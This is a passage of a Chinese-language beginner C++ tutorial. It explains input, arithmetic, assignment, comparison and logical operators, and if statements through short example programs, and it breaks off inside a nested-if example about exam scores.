<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//整型输入</span></span><br><span class="line">	<span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入整型变量：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cin &gt;&gt; a;</span><br><span class="line">	cout &lt;&lt; a &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//浮点型输入</span></span><br><span class="line">	<span class="type">double</span> d = <span class="number">0</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入浮点型变量：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cin &gt;&gt; d;</span><br><span class="line">	cout &lt;&lt; d &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//字符型输入</span></span><br><span class="line">	<span class="type">char</span> ch = <span class="number">0</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入字符型变量：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cin &gt;&gt; ch;</span><br><span class="line">	cout &lt;&lt; ch &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//字符串型输入</span></span><br><span class="line">	string str;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入字符串型变量：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cin &gt;&gt; str;</span><br><span class="line">	cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//布尔类型输入</span></span><br><span class="line">	<span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入布尔型变量：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cin &gt;&gt; flag;</span><br><span class="line">	cout &lt;&lt; flag &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>













<h2 id="3-运算符"><a href="#3-运算符" class="headerlink" title="3 运算符"></a>3 运算符</h2><p><strong>作用：</strong>用于执行代码的运算</p>
<p>本章我们主要讲解以下几类运算符：</p>
<table>
<thead>
<tr>
<th><strong>运算符类型</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td>算术运算符</td>
<td>用于处理四则运算</td>
</tr>
<tr>
<td>赋值运算符</td>
<td>用于将表达式的值赋给变量</td>
</tr>
<tr>
<td>比较运算符</td>
<td>用于表达式的比较，并返回一个真值或假值</td>
</tr>
<tr>
<td>逻辑运算符</td>
<td>用于根据表达式的值返回真值或假值</td>
</tr>
</tbody></table>
<h3 id="3-1-算术运算符"><a href="#3-1-算术运算符" class="headerlink" title="3.1 算术运算符"></a>3.1 算术运算符</h3><p><strong>作用</strong>：用于处理四则运算 </p>
<p>算术运算符包括以下符号：</p>
<table>
<thead>
<tr>
<th><strong>运算符</strong></th>
<th><strong>术语</strong></th>
<th><strong>示例</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>正号</td>
<td>+3</td>
<td>3</td>
</tr>
<tr>
<td>-</td>
<td>负号</td>
<td>-3</td>
<td>-3</td>
</tr>
<tr>
<td>+</td>
<td>加</td>
<td>10 + 5</td>
<td>15</td>
</tr>
<tr>
<td>-</td>
<td>减</td>
<td>10 - 5</td>
<td>5</td>
</tr>
<tr>
<td>*</td>
<td>乘</td>
<td>10 * 5</td>
<td>50</td>
</tr>
<tr>
<td>&#x2F;</td>
<td>除</td>
<td>10 &#x2F; 5</td>
<td>2</td>
</tr>
<tr>
<td>%</td>
<td>取模(取余)</td>
<td>10 % 3</td>
<td>1</td>
</tr>
<tr>
<td>++</td>
<td>前置递增</td>
<td>a&#x3D;2; b&#x3D;++a;</td>
<td>a&#x3D;3; b&#x3D;3;</td>
</tr>
<tr>
<td>++</td>
<td>后置递增</td>
<td>a&#x3D;2; b&#x3D;a++;</td>
<td>a&#x3D;3; b&#x3D;2;</td>
</tr>
<tr>
<td>–</td>
<td>前置递减</td>
<td>a&#x3D;2; b&#x3D;–a;</td>
<td>a&#x3D;1; b&#x3D;1;</td>
</tr>
<tr>
<td>–</td>
<td>后置递减</td>
<td>a&#x3D;2; b&#x3D;a–;</td>
<td>a&#x3D;1; b&#x3D;2;</td>
</tr>
</tbody></table>
<p><strong>示例1：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加减乘除</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a1 = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b1 = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; a1 + b1 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; a1 - b1 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; a1 * b1 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; a1 / b1 &lt;&lt; endl;  <span class="comment">//两个整数相除结果依然是整数</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a2 = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b2 = <span class="number">20</span>;</span><br><span class="line">	cout &lt;&lt; a2 / b2 &lt;&lt; endl; </span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a3 = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b3 = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//cout &lt;&lt; a3 / b3 &lt;&lt; endl; //报错，除数不可以为0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//两个小数可以相除</span></span><br><span class="line">	<span class="type">double</span> d1 = <span class="number">0.5</span>;</span><br><span class="line">	<span class="type">double</span> d2 = <span class="number">0.25</span>;</span><br><span class="line">	cout &lt;&lt; d1 / d2 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>总结：在除法运算中，除数不能为0</p>
</blockquote>
<p><strong>示例2：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//取模</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a1 = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b1 = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="number">10</span> % <span class="number">3</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a2 = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b2 = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; a2 % b2 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a3 = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b3 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//cout &lt;&lt; a3 % b3 &lt;&lt; endl; //取模运算时，除数也不能为0</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//两个小数不可以取模</span></span><br><span class="line">	<span class="type">double</span> d1 = <span class="number">3.14</span>;</span><br><span class="line">	<span class="type">double</span> d2 = <span class="number">1.1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//cout &lt;&lt; d1 % d2 &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>总结：只有整型变量可以进行取模运算</p>
</blockquote>
<p><strong>示例3：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//递增</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//后置递增</span></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	a++; <span class="comment">//等价于a = a + 1</span></span><br><span class="line">	cout &lt;&lt; a &lt;&lt; endl; <span class="comment">// 11</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//前置递增</span></span><br><span class="line">	<span class="type">int</span> b = <span class="number">10</span>;</span><br><span class="line">	++b;</span><br><span class="line">	cout &lt;&lt; b &lt;&lt; endl; <span class="comment">// 11</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//区别</span></span><br><span class="line">	<span class="comment">//前置递增先对变量进行++，再计算表达式</span></span><br><span class="line">	<span class="type">int</span> a2 = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b2 = ++a2 * <span class="number">10</span>;</span><br><span class="line">	cout &lt;&lt; b2 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//后置递增先计算表达式，后对变量进行++</span></span><br><span class="line">	<span class="type">int</span> a3 = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b3 = a3++ * <span class="number">10</span>;</span><br><span class="line">	cout &lt;&lt; b3 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>总结：前置递增先对变量进行++，再计算表达式，后置递增相反</p>
</blockquote>
<h3 id="3-2-赋值运算符"><a href="#3-2-赋值运算符" class="headerlink" title="3.2 赋值运算符"></a>3.2 赋值运算符</h3><p><strong>作用：</strong>用于将表达式的值赋给变量</p>
<p>赋值运算符包括以下几个符号：</p>
<table>
<thead>
<tr>
<th><strong>运算符</strong></th>
<th><strong>术语</strong></th>
<th><strong>示例</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody><tr>
<td>&#x3D;</td>
<td>赋值</td>
<td>a&#x3D;2; b&#x3D;3;</td>
<td>a&#x3D;2; b&#x3D;3;</td>
</tr>
<tr>
<td>+&#x3D;</td>
<td>加等于</td>
<td>a&#x3D;0; a+&#x3D;2;</td>
<td>a&#x3D;2;</td>
</tr>
<tr>
<td>-&#x3D;</td>
<td>减等于</td>
<td>a&#x3D;5; a-&#x3D;3;</td>
<td>a&#x3D;2;</td>
</tr>
<tr>
<td>*&#x3D;</td>
<td>乘等于</td>
<td>a&#x3D;2; a*&#x3D;2;</td>
<td>a&#x3D;4;</td>
</tr>
<tr>
<td>&#x2F;&#x3D;</td>
<td>除等于</td>
<td>a&#x3D;4; a&#x2F;&#x3D;2;</td>
<td>a&#x3D;2;</td>
</tr>
<tr>
<td>%&#x3D;</td>
<td>模等于</td>
<td>a&#x3D;3; a%2;</td>
<td>a&#x3D;1;</td>
</tr>
</tbody></table>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//赋值运算符</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// =</span></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	a = <span class="number">100</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// +=</span></span><br><span class="line">	a = <span class="number">10</span>;</span><br><span class="line">	a += <span class="number">2</span>; <span class="comment">// a = a + 2;</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// -=</span></span><br><span class="line">	a = <span class="number">10</span>;</span><br><span class="line">	a -= <span class="number">2</span>; <span class="comment">// a = a - 2</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// *=</span></span><br><span class="line">	a = <span class="number">10</span>;</span><br><span class="line">	a *= <span class="number">2</span>; <span class="comment">// a = a * 2</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// /=</span></span><br><span class="line">	a = <span class="number">10</span>;</span><br><span class="line">	a /= <span class="number">2</span>;  <span class="comment">// a = a / 2;</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// %=</span></span><br><span class="line">	a = <span class="number">10</span>;</span><br><span class="line">	a %= <span class="number">2</span>;  <span class="comment">// a = a % 2;</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>









<h3 id="3-3-比较运算符"><a href="#3-3-比较运算符" class="headerlink" title="3.3 比较运算符"></a>3.3 比较运算符</h3><p><strong>作用：</strong>用于表达式的比较，并返回一个真值或假值</p>
<p>比较运算符有以下符号：</p>
<table>
<thead>
<tr>
<th><strong>运算符</strong></th>
<th><strong>术语</strong></th>
<th><strong>示例</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody><tr>
<td>&#x3D;&#x3D;</td>
<td>相等于</td>
<td>4 &#x3D;&#x3D; 3</td>
<td>0</td>
</tr>
<tr>
<td>!&#x3D;</td>
<td>不等于</td>
<td>4 !&#x3D; 3</td>
<td>1</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于</td>
<td>4 &lt; 3</td>
<td>0</td>
</tr>
<tr>
<td>&gt;</td>
<td>大于</td>
<td>4 &gt; 3</td>
<td>1</td>
</tr>
<tr>
<td>&lt;&#x3D;</td>
<td>小于等于</td>
<td>4 &lt;&#x3D; 3</td>
<td>0</td>
</tr>
<tr>
<td>&gt;&#x3D;</td>
<td>大于等于</td>
<td>4 &gt;&#x3D; 1</td>
<td>1</td>
</tr>
</tbody></table>
<p>示例：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; (a == b) &lt;&lt; endl; <span class="comment">// 0 </span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; (a != b) &lt;&lt; endl; <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; (a &gt; b) &lt;&lt; endl; <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; (a &lt; b) &lt;&lt; endl; <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; (a &gt;= b) &lt;&lt; endl; <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; (a &lt;= b) &lt;&lt; endl; <span class="comment">// 1</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>注意：C和C++ 语言的比较运算中， &#x3D;&#x3D;“真”用数字“1”来表示， “假”用数字“0”来表示。&#x3D;&#x3D; </p>
</blockquote>
<h3 id="3-4-逻辑运算符"><a href="#3-4-逻辑运算符" class="headerlink" title="3.4 逻辑运算符"></a>3.4 逻辑运算符</h3><p><strong>作用：</strong>用于根据表达式的值返回真值或假值</p>
<p>逻辑运算符有以下符号：</p>
<table>
<thead>
<tr>
<th><strong>运算符</strong></th>
<th><strong>术语</strong></th>
<th><strong>示例</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody><tr>
<td>!</td>
<td>非</td>
<td>!a</td>
<td>如果a为假，则!a为真；  如果a为真，则!a为假。</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>与</td>
<td>a &amp;&amp; b</td>
<td>如果a和b都为真，则结果为真，否则为假。</td>
</tr>
<tr>
<td>||</td>
<td>或</td>
<td>a || b</td>
<td>如果a和b有一个为真，则结果为真，二者都为假时，结果为假。</td>
</tr>
</tbody></table>
<p><strong>示例1：</strong>逻辑非</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//逻辑运算符  --- 非</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; !a &lt;&lt; endl; <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; !!a &lt;&lt; endl; <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>总结： 真变假，假变真</p>
</blockquote>
<p><strong>示例2：</strong>逻辑与</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//逻辑运算符  --- 与</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; (a &amp;&amp; b) &lt;&lt; endl;<span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">	a = <span class="number">10</span>;</span><br><span class="line">	b = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; (a &amp;&amp; b) &lt;&lt; endl;<span class="comment">// 0 </span></span><br><span class="line"></span><br><span class="line">	a = <span class="number">0</span>;</span><br><span class="line">	b = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; (a &amp;&amp; b) &lt;&lt; endl;<span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>总结：逻辑&#x3D;&#x3D;与&#x3D;&#x3D;运算符总结： &#x3D;&#x3D;同真为真，其余为假&#x3D;&#x3D;</p>
</blockquote>
<p><strong>示例3：</strong>逻辑或</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//逻辑运算符  --- 或</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; (a || b) &lt;&lt; endl;<span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">	a = <span class="number">10</span>;</span><br><span class="line">	b = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; (a || b) &lt;&lt; endl;<span class="comment">// 1 </span></span><br><span class="line"></span><br><span class="line">	a = <span class="number">0</span>;</span><br><span class="line">	b = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; (a || b) &lt;&lt; endl;<span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>逻辑&#x3D;&#x3D;或&#x3D;&#x3D;运算符总结： &#x3D;&#x3D;同假为假，其余为真&#x3D;&#x3D;</p>
</blockquote>
<h2 id="4-程序流程结构"><a href="#4-程序流程结构" class="headerlink" title="4 程序流程结构"></a>4 程序流程结构</h2><p>C&#x2F;C++支持最基本的三种程序运行结构：&#x3D;&#x3D;顺序结构、选择结构、循环结构&#x3D;&#x3D;</p>
<ul>
<li>顺序结构：程序按顺序执行，不发生跳转</li>
<li>选择结构：依据条件是否满足，有选择的执行相应功能</li>
<li>循环结构：依据条件是否满足，循环多次执行某段代码</li>
</ul>
<h3 id="4-1-选择结构"><a href="#4-1-选择结构" class="headerlink" title="4.1 选择结构"></a>4.1 选择结构</h3><h4 id="4-1-1-if语句"><a href="#4-1-1-if语句" class="headerlink" title="4.1.1 if语句"></a>4.1.1 if语句</h4><p><strong>作用：</strong>执行满足条件的语句</p>
<p>if语句的三种形式</p>
<ul>
<li><p>单行格式if语句</p>
</li>
<li><p>多行格式if语句</p>
</li>
<li><p>多条件的if语句</p>
</li>
</ul>
<ol>
<li><p>单行格式if语句：<code>if(条件)&#123; 条件满足执行的语句 &#125;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/clip_image002.png"
                      alt="img"
                ></p>
<p>示例：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//选择结构-单行if语句</span></span><br><span class="line">	<span class="comment">//输入一个分数，如果分数大于600分，视为考上一本大学，并在屏幕上打印</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> score = <span class="number">0</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入一个分数：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cin &gt;&gt; score;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;您输入的分数为： &quot;</span> &lt;&lt; score &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//if语句</span></span><br><span class="line">	<span class="comment">//注意事项，在if判断语句后面，不要加分号</span></span><br><span class="line">	<span class="keyword">if</span> (score &gt; <span class="number">600</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;我考上了一本大学！！！&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<blockquote>
<p>注意：if条件表达式后不要加分号</p>
</blockquote>
<ol start="2">
<li>多行格式if语句：<code>if(条件)&#123; 条件满足执行的语句 &#125;else&#123; 条件不满足执行的语句 &#125;;</code></li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/clip_image002-1541662519170.png"
                      alt="img"
                ></p>
<p>示例：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> score = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入考试分数：&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cin &gt;&gt; score;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (score &gt; <span class="number">600</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;我考上了一本大学&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;我未考上一本大学&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>











<ol start="3">
<li>多条件的if语句：<code>if(条件1)&#123; 条件1满足执行的语句 &#125;else if(条件2)&#123;条件2满足执行的语句&#125;... else&#123; 都不满足执行的语句&#125;</code></li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/clip_image002-1541662566808.png"
                      alt="img"
                ></p>
<p>示例：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">	<span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> score = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入考试分数：&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cin &gt;&gt; score;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (score &gt; <span class="number">600</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;我考上了一本大学&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (score &gt; <span class="number">500</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;我考上了二本大学&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (score &gt; <span class="number">400</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;我考上了三本大学&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;我未考上本科&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>









<p><strong>嵌套if语句</strong>：在if语句中，可以嵌套使用if语句，达到更精确的条件判断</p>
<p>案例需求：</p>
<ul>
<li>提示用户输入一个高考考试分数，根据分数做如下判断</li>
<li>分数如果大于600分视为考上一本，大于500分考上二本，大于400考上三本，其余视为未考上本科；</li>
<li>在一本分数中，如果大于700分，考入北大，大于650分，考入清华，大于600考入人大。</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> score = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入考试分数：&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cin &gt;&gt; score;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (score &gt; <span class="number">600</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;我考上了一本大学&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">if</span> (score &gt; <span class="number">700</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;我考上了北大&quot;</span> &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (score &gt; <span class="number">650</span>)</span><br><span class="line">		